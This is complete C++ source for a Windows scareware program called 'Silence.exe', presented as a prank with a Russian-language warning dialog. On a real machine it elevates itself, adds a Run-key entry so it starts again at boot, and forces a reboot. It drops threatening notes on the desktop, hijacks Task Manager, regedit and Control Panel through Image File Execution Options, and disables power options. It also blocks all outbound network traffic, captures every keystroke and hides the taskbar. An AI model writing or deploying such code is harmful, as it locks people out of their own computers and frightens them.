#pragma execution_character_set("utf-8")
#define _WIN32_WINNT 0x0601

#include <windows.h>
#include <mmsystem.h>
#include <shellapi.h>
#include <shlobj.h>
#include <string>
#include <vector>
#include <thread>
#include <atomic>
#include <cstdlib>
#include <ctime>
#include <cmath>
#include <cstdio>
#include <cstring>
#include <cwchar>

#pragma comment(lib, "winmm.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(linker, "/SUBSYSTEM:WINDOWS")
#pragma comment(linker, "/ENTRY:wWinMainCRTStartup")

// ============================================================
// КОНФИГ
// ============================================================
namespace Cfg {
    constexpr int kTimerPhaseMs = 120000;   // 2 минуты таймера
    constexpr int kMaxPrankMs   = 600000;
    constexpr int kGlitchMs     = 1000;     // 1 сек глитч после предупреждения
}

// ============================================================
// ГЛОБАЛЫ
// ============================================================
std::atomic<bool> g_stop{false};
std::atomic<bool> g_audioStop{false};
std::atomic<int>  g_volume{40};
std::atomic<int>  g_effectLevel{0};   // 0-100 — уровень нарастания эффектов

HHOOK     g_kbHook = nullptr;
HINSTANCE g_hInst  = nullptr;

// ============================================================
// РАБОТА С РЕЕСТРОМ
// ============================================================
bool GetRegDword(HKEY root, const wchar_t* subkey, const wchar_t* value, DWORD* out) {
    HKEY h;
    if (RegOpenKeyExW(root, subkey, 0, KEY_READ, &h) != ERROR_SUCCESS) return false;
    DWORD sz = sizeof(DWORD), type = 0;
    bool ok = RegQueryValueExW(h, value, nullptr, &type, (LPBYTE)out, &sz) == ERROR_SUCCESS
              && type == REG_DWORD;
    RegCloseKey(h);
    return ok;
}

bool SetRegDword(HKEY root, const wchar_t* subkey, const wchar_t* value, DWORD data) {
    HKEY h;
    DWORD disp;
    if (RegCreateKeyExW(root, subkey, 0, nullptr, 0, KEY_SET_VALUE,
                        nullptr, &h, &disp) != ERROR_SUCCESS) return false;
    bool ok = RegSetValueExW(h, value, 0, REG_DWORD,
                             (const BYTE*)&data, sizeof(data)) == ERROR_SUCCESS;
    RegCloseKey(h);
    return ok;
}

bool SetRegString(HKEY root, const wchar_t* subkey, const wchar_t* value, const wchar_t* data) {
    HKEY h;
    DWORD disp;
    if (RegCreateKeyExW(root, subkey, 0, nullptr, 0, KEY_SET_VALUE,
                        nullptr, &h, &disp) != ERROR_SUCCESS) return false;
    bool ok = RegSetValueExW(h, value, 0, REG_SZ,
                             (const BYTE*)data,
                             (DWORD)((wcslen(data)+1)*sizeof(wchar_t))) == ERROR_SUCCESS;
    RegCloseKey(h);
    return ok;
}

int GetPhase() {
    DWORD v = 0;
    if (GetRegDword(HKEY_CURRENT_USER, L"Software\\Silence", L"Phase", &v)) return (int)v;
    return 0;
}

void SetPhase(int p) {
    SetRegDword(HKEY_CURRENT_USER, L"Software\\Silence", L"Phase", (DWORD)p);
}

// ============================================================
// УТИЛИТЫ
// ============================================================
void PumpMessages() {
    MSG m;
    while (PeekMessageW(&m, nullptr, 0, 0, PM_REMOVE)) {
        TranslateMessage(&m); DispatchMessageW(&m);
    }
}
void SleepPump(int ms) {
    DWORD s = GetTickCount();
    while ((int)(GetTickCount() - s) < ms && !g_stop.load()) {
        PumpMessages(); Sleep(10);
    }
}

bool IsElevated() {
    HANDLE t = nullptr;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &t)) return false;
    TOKEN_ELEVATION e = {}; DWORD sz = sizeof(e);
    bool ok = GetTokenInformation(t, TokenElevation, &e, sz, &sz) && e.TokenIsElevated;
    CloseHandle(t);
    return ok;
}
void RelaunchElevated() {
    wchar_t path[MAX_PATH];
    GetModuleFileNameW(nullptr, path, MAX_PATH);
    SHELLEXECUTEINFOW sei = {};
    sei.cbSize = sizeof(sei);
    sei.lpVerb = L"runas";
    sei.lpFile = path;
    sei.nShow  = SW_SHOW;
    ShellExecuteExW(&sei);
}

// ============================================================
// КЛАВИАТУРА
// ============================================================
LRESULT CALLBACK LLKeyboardProc(int n, WPARAM w, LPARAM l) {
    if (n == HC_ACTION && (w == WM_KEYDOWN || w == WM_SYSKEYDOWN ||
                           w == WM_KEYUP   || w == WM_SYSKEYUP)) return 1;
    return CallNextHookEx(g_kbHook, n, w, l);
}
void InstallKbHook() {
    g_kbHook = SetWindowsHookExW(WH_KEYBOARD_LL, LLKeyboardProc, nullptr, 0);
}
void RemoveKbHook() {
    if (g_kbHook) { UnhookWindowsHookEx(g_kbHook); g_kbHook = nullptr; }
}

// ============================================================
// ПАНЕЛЬ ЗАДАЧ
// ============================================================
void HideTaskbar() {
    HWND t = FindWindowW(L"Shell_TrayWnd", nullptr);
    if (t) ShowWindow(t, SW_HIDE);
}
void ShowTaskbar() {
    HWND t = FindWindowW(L"Shell_TrayWnd", nullptr);
    if (t) ShowWindow(t, SW_SHOW);
}

// ============================================================
// BYTEBEAT — НАРАСТАЮЩИЙ ЗВУК
// ============================================================
static inline DWORD BytebeatSample(DWORD t) {
    DWORD bass      = t >> 13;
    DWORD noise     = (t * (t >> 4)) & 0x1F;
    DWORD intensity = (t >> 18) & 0xFF;
    DWORD result    = (bass + (noise * intensity)) & 0xFF;
    return result;
}

void AudioThread() {
    const int SR  = 8000;
    const int BUF = 1024;
    const int N   = 4;

    WAVEFORMATEX wf = {};
    wf.wFormatTag      = WAVE_FORMAT_PCM;
    wf.nChannels       = 1;
    wf.nSamplesPerSec  = SR;
    wf.wBitsPerSample  = 8;
    wf.nBlockAlign     = 1;
    wf.nAvgBytesPerSec = SR;

    HWAVEOUT h = nullptr;
    if (waveOutOpen(&h, WAVE_MAPPER, &wf, 0, 0, CALLBACK_NULL) != MMSYSERR_NOERROR) return;

    std::vector<unsigned char> samp(N * BUF);
    std::vector<WAVEHDR> hdr(N);
    for (int i = 0; i < N; ++i) {
        hdr[i] = {};
        hdr[i].lpData = (LPSTR)&samp[i * BUF];
        hdr[i].dwBufferLength = BUF;
        waveOutPrepareHeader(h, &hdr[i], sizeof(WAVEHDR));
    }

    DWORD t = 0;
    int cb = 0;
    while (!g_audioStop.load()) {
        int guard = 0;
        while (!(hdr[cb].dwFlags & WHDR_DONE)) {
            if (g_audioStop.load()) goto cleanup;
            Sleep(2);
            if (++guard > 500) break;
        }

        int v = g_volume.load();
        unsigned char* buf = (unsigned char*)hdr[cb].lpData;
        for (int i = 0; i < BUF; ++i) {
            DWORD raw = BytebeatSample(t++);
            int s = (int)raw - 128;
            s = (s * v) / 100;
            if (s > 127) s = 127;
            if (s < -128) s = -128;
            buf[i] = (unsigned char)(s + 128);
        }

        hdr[cb].dwFlags &= ~WHDR_DONE;
        hdr[cb].dwBufferLength = BUF;
        waveOutWrite(h, &hdr[cb], sizeof(WAVEHDR));
        cb = (cb + 1) % N;
    }

cleanup:
    waveOutReset(h);
    for (int i = 0; i < N; ++i) waveOutUnprepareHeader(h, &hdr[i], sizeof(WAVEHDR));
    waveOutClose(h);
}

// ============================================================
// ФАЗА 0 — ГЛИТЧ ПОСЛЕ ПРЕДУПРЕЖДЕНИЯ
// ============================================================
void DoInitialGlitch() {
    int sw = GetSystemMetrics(SM_CXSCREEN);
    int sh = GetSystemMetrics(SM_CYSCREEN);
    HDC hScreen = GetDC(nullptr);
    HDC hMem = CreateCompatibleDC(hScreen);
    HBITMAP bmp = CreateCompatibleBitmap(hScreen, sw, sh);
    HBITMAP old = (HBITMAP)SelectObject(hMem, bmp);

    BitBlt(hMem, 0, 0, sw, sh, hScreen, 0, 0, SRCCOPY);

    DWORD start = GetTickCount();
    while ((int)(GetTickCount() - start) < Cfg::kGlitchMs) {
        for (int i = 0; i < 20; ++i) {
            int srcX = rand() % (sw - 200);
            int srcY = rand() % (sh - 200);
            int bw = 60 + rand() % 300;
            int bh = 40 + rand() % 200;
            int dx = srcX + (rand() % 121) - 60;
            int dy = srcY + (rand() % 121) - 60;
            BitBlt(hScreen, dx, dy, bw, bh, hMem, srcX, srcY, SRCINVERT);
        }
        Sleep(20);
    }

    BitBlt(hScreen, 0, 0, sw, sh, hMem, 0, 0, SRCCOPY);

    SelectObject(hMem, old);
    DeleteObject(bmp);
    DeleteDC(hMem);
    ReleaseDC(nullptr, hScreen);
}

// ============================================================
// ФАЗА 1 — ЧЁРНЫЕ ОБОИ + 10 ФАЙЛОВ
// ============================================================
void CreateDesktopFiles() {
    wchar_t desktop[MAX_PATH];
    if (FAILED(SHGetFolderPathW(nullptr, CSIDL_DESKTOPDIRECTORY, nullptr, 0, desktop))) {
        return;
    }

    const wchar_t* msgs[] = {
        L"Я вижу тебя.",
        L"Не двигайся.",
        L"Я знаю, где ты живёшь.",
        L"Проверь заднюю дверь.",
        L"Осталось недолго.",
        L"Ты не должен был это открывать.",
        L"Бежать бессмысленно.",
        L"Скоро увидимся.",
        L"Не закрывай глаза.",
        L"Я уже внутри."
    };

    for (int i = 0; i < 10; ++i) {
        wchar_t path[MAX_PATH];
        swprintf_s(path, L"%s\\message_%02d.txt", desktop, i + 1);

        HANDLE f = CreateFileW(path, GENERIC_WRITE, 0, nullptr,
                               CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
        if (f != INVALID_HANDLE_VALUE) {
            // UTF-8 BOM
            DWORD wr;
            WriteFile(f, "\xEF\xBB\xBF", 3, &wr, nullptr);

            // Переводим wchar в UTF-8
            int wlen = (int)wcslen(msgs[i]);
            int u8len = WideCharToMultiByte(CP_UTF8, 0, msgs[i], wlen,
                                             nullptr, 0, nullptr, nullptr);
            std::vector<char> u8(u8len);
            WideCharToMultiByte(CP_UTF8, 0, msgs[i], wlen,
                                u8.data(), u8len, nullptr, nullptr);
            WriteFile(f, u8.data(), u8len, &wr, nullptr);
            CloseHandle(f);
        }
    }
}

void SetBlackWallpaper() {
    // Сохраняем текущие обои
    wchar_t currentWall[MAX_PATH] = {};
    DWORD sz = sizeof(currentWall);
    HKEY h;
    if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Control Panel\\Desktop", 0,
                      KEY_READ, &h) == ERROR_SUCCESS) {
        RegQueryValueExW(h, L"WallPaper", nullptr, nullptr,
                         (LPBYTE)currentWall, &sz);
        RegCloseKey(h);
    }
    if (wcslen(currentWall) > 0) {
        SetRegString(HKEY_CURRENT_USER, L"Software\\Silence",
                     L"OriginalWallpaper", currentWall);
    }

    // Ставим чёрные обои
    SetRegDword(HKEY_CURRENT_USER, L"Software\\Silence",
                L"WallpaperChanged", 1);

    // Прячем иконки рабочего стола + делаем чёрный фон через реестр
    SetRegDword(HKEY_CURRENT_USER,
                L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
                L"Wallpaper", 0);

    // Простой способ — просто чёрный цвет через SystemParametersInfo
    SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, (PVOID)L"", SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
}

void Phase1_BlackDesktop() {
    SetBlackWallpaper();
    CreateDesktopFiles();
    SleepPump(3000);
}

// ============================================================
// ПЕРЕЗАГРУЗКА
// ============================================================
void DoReboot() {
    HANDLE t;
    TOKEN_PRIVILEGES tp;
    if (OpenProcessToken(GetCurrentProcess(),
        TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &t)) {
        LookupPrivilegeValueW(nullptr, SE_SHUTDOWN_NAME, &tp.Privileges[0].Luid);
        tp.PrivilegeCount = 1;
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
        AdjustTokenPrivileges(t, FALSE, &tp, 0, nullptr, nullptr);
        CloseHandle(t);
    }
    ExitWindowsEx(EWX_REBOOT | EWX_FORCE, SHTDN_REASON_MAJOR_APPLICATION);
}

void InstallToRun() {
    wchar_t path[MAX_PATH];
    GetModuleFileNameW(nullptr, path, MAX_PATH);
    SetRegString(HKEY_CURRENT_USER,
        L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        L"SilenceService", path);
}

void RemoveFromRun() {
    HKEY h;
    if (RegOpenKeyExW(HKEY_CURRENT_USER,
        L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, KEY_SET_VALUE, &h) == ERROR_SUCCESS) {
        RegDeleteValueW(h, L"SilenceService");
        RegCloseKey(h);
    }
}

// ============================================================
// ФАЗА 3 — БЛОКИРОВКИ
// ============================================================
void BlockIFEO(const wchar_t* exe) {
    wchar_t path[512];
    swprintf_s(path,
        L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\%s",
        exe);
    SetRegString(HKEY_LOCAL_MACHINE, path, L"Debugger",
                 L"notepad.exe C:\\Windows\\help_me.txt");
}

void CreateHelpFile() {
    HANDLE f = CreateFileW(L"C:\\Windows\\help_me.txt", GENERIC_WRITE, 0, nullptr,
                           CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (f != INVALID_HANDLE_VALUE) {
        const char msg[] = "\xEF\xBB\xBF"
            "\xD0\xA2\xD1\x8B \xD0\xBF\xD1\x80\xD0\xB0\xD0\xB2\xD0\xB4\xD0\xB0 "
            "\xD0\xB4\xD1\x83\xD0\xBC\xD0\xB0\xD0\xBB, \xD1\x87\xD1\x82\xD0\xBE "
            "\xD1\x8D\xD1\x82\xD0\xBE \xD0\xBF\xD0\xBE\xD0\xBC\xD0\xBE\xD0\xB6\xD0\xB5\xD1\x82?\n\n"
            "\xD0\x9D\xD0\xB5\xD1\x82.";
        DWORD wr;
        WriteFile(f, msg, (DWORD)strlen(msg), &wr, nullptr);
        CloseHandle(f);
    }
}

void BlockPower() {
    SetRegDword(HKEY_CURRENT_USER,
        L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer",
        L"NoClose", 1);
    SetRegDword(HKEY_CURRENT_USER,
        L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer",
        L"StartMenuLogOff", 1);
    SetRegDword(HKEY_LOCAL_MACHINE,
        L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer",
        L"NoPowerOptions", 1);
}

void BlockInternet() {
    // Firewall rules
    STARTUPINFOW si = {}; si.cb = sizeof(si);
    PROCESS_INFORMATION pi = {};
    wchar_t cmd[] = L"cmd.exe /c netsh advfirewall set allprofiles state on & "
                    L"netsh advfirewall firewall add rule name=\"SilenceBlock\" "
                    L"dir=out action=block";
    if (CreateProcessW(nullptr, cmd, nullptr, nullptr, FALSE,
                       CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, 5000);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
}

void ScheduleRestore() {
    // Через RunOnce восстанавливаем всё при следующей перезагрузке
    const wchar_t* restore =
        L"cmd.exe /c "
        L"reg delete \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\taskmgr.exe\" /f & "
        L"reg delete \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\regedit.exe\" /f & "
        L"reg delete \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\control.exe\" /f & "
        L"reg delete \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\SystemSettings.exe\" /f & "
        L"reg delete \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoClose /f & "
        L"reg delete \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v StartMenuLogOff /f & "
        L"reg delete \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoPowerOptions /f & "
        L"netsh advfirewall firewall delete rule name=\"SilenceBlock\"";

    SetRegString(HKEY_LOCAL_MACHINE,
        L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
        L"SilenceRestore", restore);
}

void ShowRulesWindow() {
    // Окно с правилами
    int sw = GetSystemMetrics(SM_CXSCREEN);
    int sh = GetSystemMetrics(SM_CYSCREEN);
    int w = 560, h = 360;

    MSGBOXPARAMSW p = {};
    p.cbSize = sizeof(p);
    p.hwndOwner = nullptr;
    p.lpszText =
        L"ТЕБЕ НЕ ПОМОЖЕТ:\n\n"
        L"  ✗ Диспетчер задач\n"
        L"  ✗ Редактор реестра\n"
        L"  ✗ Панель управления\n"
        L"  ✗ Параметры Windows\n"
        L"  ✗ Безопасный режим\n\n"
        L"Мы подумали обо всём.\n\n"
        L"Осталось недолго.";
    p.lpszCaption = L"Silence.exe";
    p.dwStyle = MB_OK | MB_ICONERROR | MB_TOPMOST | MB_SETFOREGROUND;
    p.dwLanguageId = MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT);
    MessageBoxIndirectW(&p);
}

void Phase3_Lockdown() {
    CreateHelpFile();
    BlockIFEO(L"taskmgr.exe");
    BlockIFEO(L"regedit.exe");
    BlockIFEO(L"control.exe");
    BlockIFEO(L"SystemSettings.exe");
    BlockPower();
    BlockInternet();
    ScheduleRestore();
    SleepPump(500);

    // Сообщение об ошибке
    MessageBoxW(nullptr,
        L"Обнаружен вредоносный процесс.\n\n"
        L"Не выключайте компьютер.",
        L"Silence.exe",
        MB_OK | MB_ICONERROR | MB_TOPMOST);

    SleepPump(500);

    // Правила
    ShowRulesWindow();

    // Сохраняем, что фаза 3 пройдена — при следующем запуске идём в фазу 4
    SetPhase(4);
}

// ============================================================
// ФАЗА 4 — ТАЙМЕР + НАРАСТАЮЩИЕ ЭФФЕКТЫ
// ============================================================
struct TimerWin { int x, y, w, h; } g_timerWin;

LRESULT CALLBACK TimerProc(HWND h, UINT m, WPARAM w, LPARAM l) {
    static DWORD startTime = 0;
    if (m == WM_CREATE) { startTime = GetTickCount(); }

    if (m == WM_ERASEBKGND) return 1;
    if (m == WM_PAINT) {
        PAINTSTRUCT ps;
        HDC dc = BeginPaint(h, &ps);
        RECT rc; GetClientRect(h, &rc);

        HBRUSH bg = CreateSolidBrush(RGB(0, 0, 0));
        FillRect(dc, &rc, bg);
        DeleteObject(bg);

        int remain = Cfg::kTimerPhaseMs / 1000 - (int)((GetTickCount() - startTime) / 1000);
        if (remain < 0) remain = 0;

        int minutes = remain / 60;
        int seconds = remain % 60;
        wchar_t timeStr[16];
        swprintf_s(timeStr, L"%02d:%02d", minutes, seconds);

        // Цвет цифр — белый, потом красный
        double prog = 1.0 - (double)remain / (Cfg::kTimerPhaseMs / 1000);
        int r = (int)(255 * prog);
        int g = 255 - (int)(255 * prog);
        COLORREF textColor = RGB(r, g, 0);

        SetBkMode(dc, TRANSPARENT);

        // Заголовок Silence.exe
        SetTextColor(dc, RGB(200, 200, 200));
        HFONT fs = CreateFontW(18, 0, 0, 0, FW_BOLD, 0, 0, 0,
            DEFAULT_CHARSET, 0, 0, CLEARTYPE_QUALITY, 0, L"Consolas");
        HFONT old = (HFONT)SelectObject(dc, fs);
        TextOutW(dc, 15, 10, L"Silence.exe", 11);

        // Таймер
        SetTextColor(dc, textColor);
        HFONT ft = CreateFontW(48, 0, 0, 0, FW_BOLD, 0, 0, 0,
            DEFAULT_CHARSET, 0, 0, CLEARTYPE_QUALITY, 0, L"Consolas");
        SelectObject(dc, ft);
        RECT tr = { 15, 40, rc.right - 15, rc.bottom - 10 };
        DrawTextW(dc, timeStr, -1, &tr, DT_CENTER | DT_VCENTER | DT_SINGLELINE);

        SelectObject(dc, old);
        DeleteObject(fs);
        DeleteObject(ft);
        EndPaint(h, &ps);
        return 0;
    }
    if (m == WM_TIMER) {
        InvalidateRect(h, nullptr, FALSE);
        return 0;
    }
    if (m == WM_DESTROY) {
        KillTimer(h, 1);
        return 0;
    }
    return DefWindowProcW(h, m, w, l);
}

void RegisterTimerClass() {
    WNDCLASSW wc = {};
    wc.hInstance     = g_hInst;
    wc.hCursor       = LoadCursor(nullptr, IDC_ARROW);
    wc.hbrBackground = nullptr;
    wc.lpfnWndProc   = TimerProc;
    wc.lpszClassName = L"SilenceTimer";
    RegisterClassW(&wc);
}

// ----- GDI-ЭФФЕКТЫ (3 штуки, нарастают) -----

void Effect_Pixelation(int intensity) {
    // 0-100
    if (intensity < 20) return;
    int sw = GetSystemMetrics(SM_CXSCREEN);
    int sh = GetSystemMetrics(SM_CYSCREEN);
    HDC hScreen = GetDC(nullptr);
    HDC hSmall = CreateCompatibleDC(hScreen);
    int blocks = 240 - (intensity * 2);
    if (blocks < 40) blocks = 40;
    HBITMAP bSmall = CreateCompatibleBitmap(hScreen, blocks, blocks * sh / sw);
    HBITMAP old = (HBITMAP)SelectObject(hSmall, bSmall);
    SetStretchBltMode(hSmall, COLORONCOLOR);
    StretchBlt(hSmall, 0, 0, blocks, blocks * sh / sw,
               hScreen, 0, 0, sw, sh, SRCCOPY);
    SetStretchBltMode(hScreen, COLORONCOLOR);
    StretchBlt(hScreen, 0, 0, sw, sh,
               hSmall, 0, 0, blocks, blocks * sh / sw, SRCCOPY);
    SelectObject(hSmall, old);
    DeleteObject(bSmall);
    DeleteDC(hSmall);
    ReleaseDC(nullptr, hScreen);
}

void Effect_Glitch(int intensity) {
    if (intensity < 30) return;
    int sw = GetSystemMetrics(SM_CXSCREEN);
    int sh = GetSystemMetrics(SM_CYSCREEN);
    HDC hScreen = GetDC(nullptr);
    int count = intensity / 10;
    for (int i = 0; i < count; ++i) {
        int srcX = rand() % (sw - 200);
        int srcY = rand() % (sh - 200);
        int bw = 50 + rand() % 200;
        int bh = 30 + rand() % 150;
        int dx = srcX + (rand() % 61) - 30;
        int dy = srcY + (rand() % 61) - 30;
        BitBlt(hScreen, dx, dy, bw, bh, hScreen, srcX, srcY, SRCINVERT);
    }
    ReleaseDC(nullptr, hScreen);
}

void Effect_RedFilter(int intensity) {
    if (intensity < 40) return;
    int sw = GetSystemMetrics(SM_CXSCREEN);
    int sh = GetSystemMetrics(SM_CYSCREEN);
    HDC hScreen = GetDC(nullptr);
    HDC hRed = CreateCompatibleDC(hScreen);
    HBITMAP bRed = CreateCompatibleBitmap(hScreen, sw, sh);
    HBITMAP old = (HBITMAP)SelectObject(hRed, bRed);
    HBRUSH rb = CreateSolidBrush(RGB(150, 0, 0));
    RECT full = { 0, 0, sw, sh };
    FillRect(hRed, &full, rb);
    DeleteObject(rb);

    BYTE alpha = (BYTE)((intensity - 40) * 40 / 60);
    BLENDFUNCTION bf = { AC_SRC_OVER, 0, alpha, 0 };
    AlphaBlend(hScreen, 0, 0, sw, sh, hRed, 0, 0, sw, sh, bf);

    SelectObject(hRed, old);
    DeleteObject(bRed);
    DeleteDC(hRed);
    ReleaseDC(nullptr, hScreen);
}

void Phase4_Timer() {
    RegisterTimerClass();

    int sw = GetSystemMetrics(SM_CXSCREEN);
    int sh = GetSystemMetrics(SM_CYSCREEN);

    // Окно таймера в правом верхнем углу
    int w = 260, h = 120;
    int x = sw - w - 20;
    int y = 20;

    HWND hw = CreateWindowExW(
        WS_EX_TOPMOST | WS_EX_TOOLWINDOW,
        L"SilenceTimer", L"",
        WS_POPUP | WS_BORDER,
        x, y, w, h,
        nullptr, nullptr, g_hInst, nullptr);
    ShowWindow(hw, SW_SHOWNOACTIVATE);
    SetTimer(hw, 1, 500, nullptr);
    UpdateWindow(hw);

    // Аудио
    g_volume = 40;
    std::thread tAudio(AudioThread);

    DWORD start = GetTickCount();
    while (!g_stop.load() && (int)(GetTickCount() - start) < Cfg::kTimerPhaseMs) {
        DWORD elapsed = GetTickCount() - start;
        int intensity = (int)(100.0 * elapsed / Cfg::kTimerPhaseMs);
        g_effectLevel = intensity;

        // Громкость растёт от 40% до 200%
        g_volume = 40 + (int)(160.0 * elapsed / Cfg::kTimerPhaseMs);

        // Три эффекта — все нарастают
        Effect_Pixelation(intensity);
        Effect_Glitch(intensity);
        Effect_RedFilter(intensity);

        PumpMessages();
        Sleep(80);
    }

    // Резкий обрыв — убираем всё
    g_audioStop = true;
    g_volume = 0;
    if (tAudio.joinable()) tAudio.join();

    DestroyWindow(hw);

    // Чёрный экран
    HDC hScreen = GetDC(nullptr);
    HBRUSH black = CreateSolidBrush(RGB(0, 0, 0));
    RECT full = { 0, 0, sw, sh };
    FillRect(hScreen, &full, black);
    DeleteObject(black);
    ReleaseDC(nullptr, hScreen);
}

// ============================================================
// ТОЧКА ВХОДА
// ============================================================
int WINAPI wWinMain(HINSTANCE hInst, HINSTANCE, LPWSTR, int) {
    SetProcessDPIAware();
    g_hInst = hInst;
    srand((unsigned)time(nullptr));

    HANDLE hMutex = CreateMutexW(nullptr, TRUE, L"SilenceMutex_v1");
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        if (hMutex) CloseHandle(hMutex);
        return 0;
    }

    if (!IsElevated()) {
        RelaunchElevated();
        if (hMutex) { ReleaseMutex(hMutex); CloseHandle(hMutex); }
        return 0;
    }

    int phase = GetPhase();

    // ===== ПЕРВЫЙ ЗАПУСК =====
    if (phase == 0) {
        int r = MessageBoxW(nullptr,
            L"SILENCE.EXE\n\n"
            L"ВНИМАНИЕ!\n\n"
            L"Эта программа — ПРАНК.\n"
            L"Но она МОЖЕТ СИЛЬНО НАПУГАТЬ.\n\n"
            L"Запускайте ТОЛЬКО на виртуальной машине.\n"
            L"Могут произойти ошибки.\n"
            L"Данные могут быть утеряны.\n\n"
            L"Продолжить?",
            L"Silence.exe — предупреждение",
            MB_YESNO | MB_ICONWARNING | MB_TOPMOST);
        if (r != IDYES) {
            if (hMutex) { ReleaseMutex(hMutex); CloseHandle(hMutex); }
            return 0;
        }

        // Глитч после предупреждения
        DoInitialGlitch();

        // Фаза 1
        Phase1_BlackDesktop();

        // Установка в Run + сброс фазы на 3 (после ребута)
        InstallToRun();
        SetPhase(3);

        // Ребут
        SleepPump(1000);
        DoReboot();
        return 0;
    }

    // ===== ПОСЛЕ РЕБУТА (фаза 3) =====
    if (phase == 3) {
        SleepPump(2000);  // ждём загрузки
        Phase3_Lockdown();
        // После фазы 3 сразу фаза 4
        // (fallthrough)
        phase = 4;
    }

    // ===== ФАЗА 4 =====
    if (phase == 4) {
        InstallKbHook();
        HideTaskbar();
        Phase4_Timer();
        RemoveKbHook();
        ShowTaskbar();
        SetPhase(5);
        // Тут в следующих частях будет фаза 5+
    }

    if (hMutex) { ReleaseMutex(hMutex); CloseHandle(hMutex); }
    return 0;
}
